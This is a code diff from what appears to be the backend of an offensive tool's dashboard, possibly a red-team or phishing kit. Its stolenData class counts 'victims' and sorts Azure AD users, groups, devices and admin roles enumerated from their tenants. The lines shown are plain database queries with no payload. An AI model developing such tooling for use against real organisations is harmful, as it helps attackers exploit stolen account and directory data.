@@ -143,6 +143,9 @@ class stolenData():
     def getAllvictims():
         return Allusers.query.filter_by(uuid= current_user.id).limit(2).all()
 
+    def getTotalvictims():
+        return Allusers.query.filter_by(uuid= current_user.id).count()
+
     def getVisitors():
         return Visitors.query.with_entities(Visitors.ip, Visitors.uuid).filter_by(uuid=current_user.id).distinct().count()
 
@@ -152,7 +155,7 @@ class stolenData():
 def enumeratedData(victim):
     class get():
         azureAdGroupData = azureAdEnumeratedGroups.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
-        azureAdUsersData = azureAdEnumeratedUsers.query.filter_by(uuid=current_user.id, victim=victim).order_by(azureAdEnumeratedUsers.roles.desc()).limit(1000).all()
+        azureAdUsersData = azureAdEnumeratedUsers.query.filter_by(uuid=current_user.id, victim=victim).order_by(azureAdEnumeratedUsers.roles.desc(), azureAdEnumeratedUsers.usersGroups.desc()).limit(1000).all()
         azureAdDeviceData = azureAdEnumeratedDevices.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
         azureAdAdminusers = azureAdEnumeratedAdmins.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
         azureAdCustomDirectoryRoles = azureAdEnumeratedCustomDirectoryRoles.query.filter_by(uuid=current_user.id, victim=victim).limit(1000).all()
